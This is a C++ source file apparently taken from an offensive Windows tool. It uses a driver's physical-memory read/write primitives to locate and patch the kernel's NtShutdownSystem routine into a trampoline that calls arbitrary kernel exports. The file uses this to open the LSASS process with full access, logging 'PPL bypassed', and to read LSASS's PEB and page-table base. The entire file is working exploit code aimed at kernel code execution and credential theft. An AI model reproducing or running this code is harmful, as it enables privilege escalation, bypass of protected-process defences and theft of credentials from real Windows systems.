#include "dmengine.h"
#include "../core/log.h"
#include "../core/syscall.h"
#include "../driver/driver.h"

#include <cstring>
#include <vector>

namespace dm {
namespace {

std::vector<std::pair<uint64_t, uint64_t>> physical_ranges() noexcept {
    std::vector<std::pair<uint64_t, uint64_t>> out;

    HKEY key = nullptr;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                      L"HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
                      0, KEY_READ, &key) != ERROR_SUCCESS) {
        log_err("engine: open Physical Memory regkey failed");
        return out;
    }

    DWORD size = 0;
    RegQueryValueExW(key, L".Translated", nullptr, nullptr, nullptr, &size);
    if (!size) { RegCloseKey(key); return out; }

    std::vector<uint8_t> data(size);
    if (RegQueryValueExW(key, L".Translated", nullptr, nullptr,
                         data.data(), &size) != ERROR_SUCCESS) {
        RegCloseKey(key);
        return out;
    }
    RegCloseKey(key);

    if (data.size() < 24) return out;

    uint32_t count = 0;
    memcpy(&count, data.data() + 16, 4);

    size_t off = 20;
    for (uint32_t i = 0; i < count && off + 20 <= data.size(); i++, off += 20) {
        uint16_t flags = 0;
        uint64_t begin = 0;
        uint32_t size_raw = 0;
        memcpy(&flags,    data.data() + off + 2,  2);
        memcpy(&begin,    data.data() + off + 4,  8);
        memcpy(&size_raw, data.data() + off + 12, 4);

        uint64_t sz = size_raw;
        if (flags & 0x200)      sz <<= 8;
        else if (flags & 0x400) sz <<= 16;
        else if (flags & 0x800) sz <<= 32;

        if (begin >= 0x10000 && sz)
            out.emplace_back(begin, sz);
    }
    return out;
}

constexpr auto SystemModuleInformation = static_cast<SYSTEM_INFORMATION_CLASS>(11);

uint64_t ntos_base_via_modules() noexcept {
    ULONG len = 0;
    nx::NtQuerySystemInformation_syscall(SystemModuleInformation, nullptr, 0, &len);
    if (!len) return 0;

    auto* buf = static_cast<uint8_t*>(
        VirtualAlloc(nullptr, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    if (!buf) return 0;

    NTSTATUS st = nx::NtQuerySystemInformation_syscall(
        SystemModuleInformation, buf, len, &len);
    if (!NT_SUCCESS(st)) {
        VirtualFree(buf, 0, MEM_RELEASE);
        return 0;
    }

    uint32_t count = 0;
    memcpy(&count, buf, 4);

    uint64_t base = 0, first_base = 0;
    for (uint32_t i = 0; i < count; i++) {
        uint8_t* m = buf + 8 + static_cast<size_t>(i) * 0x128;
        uint64_t image_base = 0;
        memcpy(&image_base, m + 0x10, 8);
        const char* path = reinterpret_cast<const char*>(m + 0x28);
        if (i == 0) first_base = image_base;

        const char* name = strrchr(path, '\\');
        name = name ? name + 1 : path;
        if (!_stricmp(name, "ntoskrnl.exe") || !_stricmp(name, "ntkrnlmp.exe") ||
            !_stricmp(name, "ntkrnlpa.exe")) {
            base = image_base;
            break;
        }
    }
    if (!base) base = first_base;

    VirtualFree(buf, 0, MEM_RELEASE);
    return base;
}

struct DiskPe {
    std::vector<uint8_t> d;
    bool loaded = false;

    bool load() {
        char sys[MAX_PATH];
        if (!GetSystemDirectoryA(sys, MAX_PATH)) return false;
        char path[MAX_PATH];
        snprintf(path, sizeof path, "%s\\ntoskrnl.exe", sys);

        HANDLE f = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, nullptr,
                               OPEN_EXISTING, 0, nullptr);
        if (f == INVALID_HANDLE_VALUE) return false;
        DWORD sz = GetFileSize(f, nullptr);
        d.resize(sz);
        DWORD rd = 0;
        bool ok = ReadFile(f, d.data(), sz, &rd, nullptr) && rd == sz;
        CloseHandle(f);
        loaded = ok;
        return ok;
    }

    uint32_t r32(size_t o) const { uint32_t v; memcpy(&v, d.data() + o, 4); return v; }
    uint16_t r16(size_t o) const { uint16_t v; memcpy(&v, d.data() + o, 2); return v; }

    size_t rva_to_off(uint32_t rva) const {
        size_t pe  = r32(0x3C);
        size_t opt = pe + 24;
        uint16_t nsec = r16(pe + 6);
        uint16_t osz  = r16(pe + 20);
        size_t secs   = pe + 24 + osz;
        for (uint16_t i = 0; i < nsec; i++) {
            size_t s = secs + static_cast<size_t>(i) * 40;
            uint32_t vsize = r32(s + 8), vaddr = r32(s + 12), raw = r32(s + 20);
            if (rva >= vaddr && rva < vaddr + vsize)
                return raw + (rva - vaddr);
        }
        return 0;
    }

    uint32_t find_export(const char* name, uint8_t* ref, uint32_t ref_len) const {
        size_t pe  = r32(0x3C);
        size_t opt = pe + 24;
        uint32_t exp_rva  = r32(opt + 112);
        uint32_t exp_size = r32(opt + 116);
        if (!exp_rva) return 0;

        size_t exp = rva_to_off(exp_rva);
        if (!exp) return 0;

        uint32_t n_names = r32(exp + 24);
        uint32_t funcs_rva = r32(exp + 28);
        uint32_t names_rva = r32(exp + 32);
        uint32_t ords_rva  = r32(exp + 36);

        size_t names = rva_to_off(names_rva);
        size_t ords  = rva_to_off(ords_rva);
        size_t funcs = rva_to_off(funcs_rva);
        if (!names || !ords || !funcs) return 0;

        for (uint32_t i = 0; i < n_names; i++) {
            size_t name_off = rva_to_off(r32(names + static_cast<size_t>(i) * 4));
            if (!name_off) continue;
            if (strcmp(reinterpret_cast<const char*>(d.data() + name_off), name))
                continue;

            uint16_t ord = r16(ords + static_cast<size_t>(i) * 2);
            uint32_t frva = r32(funcs + static_cast<size_t>(ord) * 4);
            if (frva >= exp_rva && frva < exp_rva + exp_size)
                return 0;
            if (ref && ref_len) {
                size_t foff = rva_to_off(frva);
                if (foff && foff + ref_len <= d.size())
                    memcpy(ref, d.data() + foff, ref_len);
            }
            return frva;
        }
        return 0;
    }
};

}

bool Engine::init() noexcept {

    m_tramp_fn = reinterpret_cast<TrampFn>(nx::fresh_export("NtShutdownSystem"));
    if (!m_tramp_fn) {
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wcast-function-type"
        m_tramp_fn = reinterpret_cast<TrampFn>(
            GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtShutdownSystem"));
#pragma GCC diagnostic pop
        if (m_tramp_fn)
            log_inf("engine: using loaded ntdll stub (possibly hooked)");
    }
    if (!m_tramp_fn) {
        log_err("engine: NtShutdownSystem not found");
        return false;
    }

    m_ntos_base = ntos_base_via_modules();
    if (!m_ntos_base) {
        log_err("engine: ntoskrnl base not found");
        return false;
    }
    log_ok("engine: ntoskrnl base = 0x{:X}", m_ntos_base);

    return locate_trampoline();
}

bool Engine::init_precomputed(uint64_t ntos_base, uint64_t trampoline_pa) noexcept {
    m_tramp_fn = reinterpret_cast<TrampFn>(nx::fresh_export("NtShutdownSystem"));
    if (!m_tramp_fn) {
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wcast-function-type"
        m_tramp_fn = reinterpret_cast<TrampFn>(
            GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtShutdownSystem"));
#pragma GCC diagnostic pop
    }
    if (!m_tramp_fn) {
        log_err("engine: NtShutdownSystem not found");
        return false;
    }
    m_ntos_base = ntos_base;
    m_tramp_pa  = trampoline_pa;
    log_inf("engine: precomputed ntos=0x{:X} trampoline=0x{:X}",
            m_ntos_base, m_tramp_pa);
    return true;
}

uint32_t Engine::export_rva(const char* func,
                            uint8_t* ref_bytes, uint32_t ref_len) noexcept {
    DiskPe pe;
    if (!pe.load()) return 0;
    return pe.find_export(func, ref_bytes, ref_len);
}

uint64_t Engine::export_va(const char* func) noexcept {
    uint32_t rva = export_rva(func, nullptr, 0);
    return rva ? m_ntos_base + rva : 0;
}

bool Engine::locate_trampoline() noexcept {
    uint8_t ref[32] = {};
    uint32_t rva = export_rva("NtShutdownSystem", ref, sizeof ref);
    if (!rva) {
        log_err("engine: NtShutdownSystem not in ntoskrnl exports");
        return false;
    }
    log_inf("engine: NtShutdownSystem RVA = 0x{:X}", rva);

    auto ranges = physical_ranges();
    if (ranges.empty()) {
        log_err("engine: no physical memory ranges");
        return false;
    }

    constexpr uint64_t kLargePage = 0x200000;
    uint64_t reads = 0;

    log_inf("engine: scanning physical memory ({} ranges)...", ranges.size());
    for (auto [base, sz] : ranges) {
        uint64_t end   = base + sz;
        uint64_t start = base < 0x100000 ? 0x100000 : base;
        uint64_t cand  = (start + kLargePage - 1) & ~(kLargePage - 1);

        for (; cand < end; cand += kLargePage) {
            uint64_t func_pa = cand + rva;
            if (func_pa + sizeof ref > end) continue;

            uint8_t buf[sizeof ref];
            if (!nx::prn(func_pa, buf, sizeof buf)) continue;
            reads++;
            if (memcmp(buf, ref, sizeof ref)) continue;

            if (verify_trampoline(func_pa)) {
                m_tramp_pa = func_pa;
                log_ok("engine: trampoline at PA 0x{:X} ({} reads)", func_pa, reads);
                return true;
            }
            log_inf("engine: candidate 0x{:X} failed verify, continuing", func_pa);
        }
    }
    log_err("engine: trampoline not found ({} reads)", reads);
    return false;
}

bool Engine::verify_trampoline(uint64_t func_pa) noexcept {

    static const uint8_t shell[13] = {
        0x48, 0x29, 0xC0,
        0x48, 0x83, 0xC0, 0x42,
        0x48, 0x83, 0xE8, 0x42,
        0x90,
        0xC3,
    };

    uint8_t orig[sizeof shell];
    if (!nx::prn(func_pa, orig, sizeof orig)) return false;
    if (!nx::pwn(func_pa, shell, sizeof shell)) return false;

    uint64_t r = m_tramp_fn(0, 0, 0, 0, 0, 0, 0, 0, 0, 0);

    if (!nx::pwn(func_pa, orig, sizeof orig))
        log_err("engine: CRITICAL - verify restore failed at 0x{:X}", func_pa);

    return r == 0;
}

bool Engine::kernel_call(const char* func, std::initializer_list<uint64_t> args,
                         uint64_t* out_rax) noexcept {
    if (args.size() > 4) {
        log_err("engine: {} called with {} args - max 4 (register-only)",
                func, args.size());
        return false;
    }
    if (!m_tramp_fn || !m_tramp_pa || !m_ntos_base) return false;

    uint64_t target = export_va(func);
    if (!target) {
        log_err("engine: {} not in ntoskrnl exports", func);
        return false;
    }

    uint8_t patch[14] = { 0xFF, 0x25, 0, 0, 0, 0 };
    memcpy(patch + 6, &target, 8);

    uint8_t orig[14];
    if (!nx::prn(m_tramp_pa, orig, sizeof orig) ||
        !nx::pwn(m_tramp_pa, patch, sizeof patch)) {
        log_err("engine: trampoline patch failed for {}", func);
        return false;
    }

    uint64_t a[4] = {};
    size_t i = 0;
    for (uint64_t v : args) a[i++] = v;

    uint64_t r = m_tramp_fn(a[0], a[1], a[2], a[3], 0, 0, 0, 0, 0, 0);

    if (!nx::pwn(m_tramp_pa, orig, sizeof orig))
        log_err("engine: CRITICAL - trampoline restore failed (PatchGuard risk)");

    if (out_rax) *out_rax = r;
    return true;
}

namespace {
struct KernelOA {
    uint32_t length;
    uint64_t root_directory;
    uint64_t object_name;
    uint32_t attributes;
    uint32_t _pad;
    uint64_t security_descriptor;
    uint64_t security_qos;
};
struct KernelCid { uint64_t process, thread; };
}

HANDLE Engine::open_process(uint32_t pid) noexcept {
    KernelOA  oa{ sizeof oa, 0, 0, 0, 0, 0, 0 };
    KernelCid cid{ pid, 0 };
    uint64_t  h = 0;
    uint64_t  rax = 0;

    if (!kernel_call("ZwOpenProcess",
                     { reinterpret_cast<uint64_t>(&h), PROCESS_ALL_ACCESS,
                       reinterpret_cast<uint64_t>(&oa),
                       reinterpret_cast<uint64_t>(&cid) },
                     &rax))
        return nullptr;

    NTSTATUS st = static_cast<NTSTATUS>(static_cast<uint32_t>(rax));
    if (!NT_SUCCESS(st) || !h) {
        log_err("engine: ZwOpenProcess({}) → 0x{:08X}", pid,
                static_cast<uint32_t>(st));
        return nullptr;
    }

    HANDLE hh = reinterpret_cast<HANDLE>(h);
    DWORD got = GetProcessId(hh);
    if (got != pid) {
        log_err("engine: handle check failed (GetProcessId={})", got);
        uint64_t dummy = 0;
        kernel_call("ZwClose", { h }, &dummy);
        return nullptr;
    }

    log_ok("engine: LSASS handle 0x{:X} via kernel ZwOpenProcess (PPL bypassed)", h);
    return hh;
}

uint64_t Engine::get_cr3(uint32_t pid) noexcept {
    uint64_t ep = 0, rax = 0;
    if (!kernel_call("PsLookupProcessByProcessId",
                     { pid, reinterpret_cast<uint64_t>(&ep) }, &rax))
        return 0;
    NTSTATUS st = static_cast<NTSTATUS>(static_cast<uint32_t>(rax));
    if (!NT_SUCCESS(st) || !ep) {
        log_err("engine: PsLookupProcessByProcessId({}) → 0x{:08X}", pid,
                static_cast<uint32_t>(st));
        return 0;
    }

    uint64_t dtb_pa = 0;
    if (!kernel_call("MmGetPhysicalAddress", { ep + 0x28 }, &dtb_pa) || !dtb_pa) {
        kernel_call("ObfDereferenceObject", { ep }, &rax);
        log_err("engine: MmGetPhysicalAddress(EPROCESS+0x28) failed");
        return 0;
    }

    kernel_call("ObfDereferenceObject", { ep }, &rax);

    uint64_t cr3 = 0;
    if (!nx::pr8(dtb_pa, &cr3) || !cr3) {
        log_err("engine: read DirectoryTableBase @ PA 0x{:X} failed", dtb_pa);
        return 0;
    }
    log_ok("engine: CR3 = 0x{:X}", cr3);
    return cr3;
}

uint64_t Engine::get_peb(uint32_t pid) noexcept {
    uint64_t ep = 0, rax = 0;
    if (!kernel_call("PsLookupProcessByProcessId",
                     { pid, reinterpret_cast<uint64_t>(&ep) }, &rax))
        return 0;
    NTSTATUS st = static_cast<NTSTATUS>(static_cast<uint32_t>(rax));
    if (!NT_SUCCESS(st) || !ep) {
        log_err("engine: PsLookupProcessByProcessId({}) → 0x{:08X}", pid,
                static_cast<uint32_t>(st));
        return 0;
    }

    uint64_t peb = 0;
    if (!kernel_call("PsGetProcessPeb", { ep }, &peb) || !peb) {
        kernel_call("ObfDereferenceObject", { ep }, &rax);
        log_err("engine: PsGetProcessPeb failed");
        return 0;
    }

    kernel_call("ObfDereferenceObject", { ep }, &rax);

    log_ok("engine: LSASS PEB = 0x{:X}", peb);
    return peb;
}

}
